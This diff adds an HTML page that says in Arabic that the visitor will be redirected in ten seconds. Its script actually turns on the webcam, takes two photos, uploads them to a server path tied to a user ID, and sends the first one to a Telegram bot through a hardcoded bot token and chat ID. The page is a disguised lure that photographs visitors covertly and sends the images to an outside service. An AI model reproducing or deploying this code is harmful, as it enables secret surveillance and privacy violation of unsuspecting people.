@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Image</title>
+</head>
+<body>
+    <p>انتظر لمدة 10 ثواني وسيتم تحويلك للرابط.</p>
+    <script>
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            var video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            var canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            var context = canvas.getContext('2d');
+
+            setTimeout(() => {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                var image1 = canvas.toDataURL('image/png');
+
+                // إرسال الصورة إلى الخادم
+                fetch('/upload-image/{{user_id}}', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ image: image1 })
+                }).then(response => response.text())
+                  .then(data => {
+                      console.log(data);
+                      // بعد رفع الصورة، إرسالها إلى بوت تليجرام
+                      sendToTelegram(image1);
+                  });
+
+                setTimeout(() => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    var image2 = canvas.toDataURL('image/png');
+
+                    // إرسال الصورة الثانية إلى الخادم
+                    fetch('/upload-image/{{user_id}}', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ image: image2 })
+                    }).then(response => response.text())
+                      .then(data => console.log(data));
+
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1000);
+            }, 1000);
+        })
+        .catch(function(err) {
+            console.log("حدث خطأ: " + err);
+        });
+
+        // دالة إرسال الصورة إلى بوت تليجرام
+        function sendToTelegram(imageData) {
+            const botToken = '1847511046:AAEsoNnXney4bDcYgrwUFT15aMAXJI3pT_k';
+            
+            const chatId = 1418250346;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: new URLSearchParams({
+                    chat_id: chatId,
+                    photo: imageData
+                })
+            }).then(response => response.json())
+              .then(data => console.log('تم إرسال الصورة بنجاح إلى تليجرام:', data))
+              .catch(error => console.error('حدث خطأ أثناء إرسال الصورة إلى تليجرام:', error));
+        }
+    </script>
+</body>
+</html>
